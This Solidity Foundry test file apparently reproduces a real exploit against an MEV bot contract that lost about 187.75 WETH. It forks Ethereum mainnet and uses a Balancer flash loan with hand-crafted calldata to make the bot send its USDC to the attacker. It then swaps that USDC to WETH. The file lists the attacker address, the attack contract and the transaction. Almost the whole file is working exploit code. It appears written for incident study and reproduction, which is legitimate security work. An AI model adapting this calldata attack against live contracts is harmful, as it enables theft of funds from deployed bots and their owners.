// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~187.75 WETH
// Attacker : 0x1dc90b5b7FE74715C2056e5158641c0af7d28865
// Attack Contract : https://etherscan.io/address/0x4b77c789fa35b54dacb5f6bb2daaa01554299d6c
// Vulnerable Contract : https://etherscan.io/address/0x00000000000a47b1298f18cf67de547bbe0d723f#code
// Attack Tx : https://etherscan.io/tx/0x35ecf595864400696853c53edf3e3d60096639b6071cadea6076c9c6ceb921c1

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x00000000000a47b1298f18cf67de547bbe0d723f#code (unverified)

// @Analysis
// Twitter BlockSecTeam : https://twitter.com/BlockSecTeam/status/1580779311862190080
// Twitter Ancilia : https://twitter.com/AnciliaInc/status/1580705036400611328

contract ContractTest is Test {
    IWETH constant WETH_TOKEN = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IUSDC constant USDC_TOKEN = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IBalancerVault constant BALANCER_VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address constant MEV_BOT = 0x00000000000A47b1298f18Cf67de547bbE0D723F;
    address constant EXPLOIT_CONTRACT = 0x4b77c789fa35B54dAcB5F6Bb2dAAa01554299d6C;
    IUniswapV2Pair constant WETH_USDC_PAIR_SUSHI = IUniswapV2Pair(0x397FF1542f962076d0BFE58eA045FfA2d347ACa0);
    Uni_Router_V3 constant UNI_ROUTER = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    function setUp() public {
        vm.createSelectFork("mainnet", 15_741_332);
        // Adding labels to improve stack traces' readability
        vm.label(address(WETH_TOKEN), "WETH_TOKEN");
        vm.label(address(USDC_TOKEN), "USDC_TOKEN");
        vm.label(address(BALANCER_VAULT), "BALANCER_VAULT");
        vm.label(MEV_BOT, "MEV_BOT");
        vm.label(EXPLOIT_CONTRACT, "EXPLOIT_CONTRACT");
        vm.label(address(WETH_USDC_PAIR_SUSHI), "WETH_USDC_PAIR_SUSHI");
        vm.label(0x8ad599c3A0ff1De082011EFDDc58f1908eb6e6D8, "WETH_USDC_POOL_2");
        vm.label(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640, "WETH_USDC_POOL_3");
        vm.label(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc, "WETH_USDC_PAIR_V2");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "\n[Start] Attacker WETH balance before exploit", WETH_TOKEN.balanceOf(address(this)), 18
        );

        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH_TOKEN);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1;
        // Not really know how this byte calldata works
        bytes memory userData = bytes.concat(
            abi.encode(
                0x0000000000000000000000000000000000000000000000000000000000000080,
                0x0000000000000000000000000000000000000000000000000000000000000100,
                0x0000000000000000000000000000000000000000000000000000000000000280,
                0x00000000000000000000000000000000000000000000000a2d7f7bb876b5a551,
                0x0000000000000000000000000000000000000000000000000000000000000003,
                address(WETH_TOKEN),
                address(USDC_TOKEN),
                address(WETH_TOKEN),
                0x0000000000000000000000000000000000000000000000000000000000000002,
                0x0000000000000000000000000000000000000000000000000000000000000040,
                0x00000000000000000000000000000000000000000000000000000000000000c0
            ),
            abi.encode(
                0x0000000000000000000000000000000000000000000000000000000000000060,
                0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2a0b86991c6218b36c1d19d4a,
                0x2e9eb0ce3606eb48000000000000000000000000000000000000000000000000,
                0x0000000a707868e3b4dea47088e6a0c2ddd26feeb64f039a2c41296fcb3f5640,
                0x0000000000000000000000000000000000000000000000000000000000000064,
                0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48c02aaa39b223fe8d0a0e5c4f,
                0x27ead9083c756cc2000000000000000000000000000000000000000000000000,
                // original: 0x000000000000003d539801af4b77c789fa35b54dacb5f6bb2daaa01554299d6c,
                // 3d539801af + address(EXPLOIT_CONTRACT)
                // PoC: 0x000000000000003d539801af7FA9385bE102ac3EAc297483Dd6233D62b3e1496
                // 3d539801af + address(EXPLOIT_CONTRACT)
                0x000000000000003d539801af7FA9385bE102ac3EAc297483Dd6233D62b3e1496,
                0x26f2000000000000000000000000000000000000000000000000000000000000,
                0x0000000000000000000000000000000000000000000000000000000000000002,
                0x0000000000000000000000000000000000000000000000000000000000000008,
                0x0000000000000000000000000000000000000000000000000000000000000000
            )
        );
        BALANCER_VAULT.flashLoan(MEV_BOT, tokens, amounts, userData);

        emit log_named_decimal_uint(
            "\tAttacker USDC balance during the exploit...", USDC_TOKEN.balanceOf(address(this)), 6
        );

        // Exchanging all USDC for WETH
        USDC_TOKEN.approve(address(UNI_ROUTER), type(uint256).max);
        _USDCToWETH();

        emit log_named_decimal_uint(
            "\n[End] Attacker WETH balance after exploit", WETH_TOKEN.balanceOf(address(this)), 18
        );
    }

    function getReserves() external view returns (uint112, uint112, uint32) {
        return WETH_USDC_PAIR_SUSHI.getReserves();
    }

    function swap(uint256, uint256, address, bytes calldata) external pure {
        return;
    }

    /**
     * Auxiliary function to swap all USDC to WETH
     */
    function _USDCToWETH() internal {
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(USDC_TOKEN),
            tokenOut: address(WETH_TOKEN),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: USDC_TOKEN.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        UNI_ROUTER.exactInputSingle(_Params);
    }
}
